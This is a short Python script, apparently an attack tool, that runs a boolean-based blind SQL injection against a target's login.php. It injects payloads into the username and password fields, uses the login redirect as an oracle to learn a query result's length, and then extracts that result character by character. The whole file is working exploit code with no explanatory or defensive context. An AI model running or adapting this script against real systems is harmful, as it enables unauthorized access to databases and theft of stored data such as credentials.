import requests, sys

url = "http://"+sys.argv[1]+"/login.php" # URL

alpha = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
pos = 1
query = sys.argv[2]

def getLength():
	for lng in range(1,100):
		payload = "' or length((%s))=%s#" % (query,str(lng))
		data = {
			"uname": "x",
			"psw": payload,
		}
		# proxies = {"http":"http://127.0.0.1:2222"}
		# req = requests.post(url, data=data, allow_redirects=False, proxies=proxies)
		req = requests.post(url, data=data, allow_redirects=False)

		try:
			if "profile" in req.headers['location']:
				return lng
				break
			else:
				pass
		except KeyError:
				print("[-] Error with Query.")
				break

def extract(length):
	out = []
	for lng in range(1,length+1):
		for char in alpha:
			payload = "' or (ascii(substring(("+query+"),"+str(lng)+",1)))='"+str(ord(char))+"'#"
			data = {
				"uname": payload,
				"psw":"x",
			}
			# proxies = {"http":"http://127.0.0.1:2222"}
			#req = requests.post(url, data=data, allow_redirects=False, proxies=proxies)
			req = requests.post(url, data=data, allow_redirects=False)
			try:
				if "profile" in req.headers['location']:
					out.append(char)
					# pos+=1
					break
				else:
					pass
			except KeyError:
				print("[-] Error with Query.")
				break
	return ''.join(out)

length = getLength()
print ("Length: "+str(length))
if length != None:
	data = extract(length)
	print(data)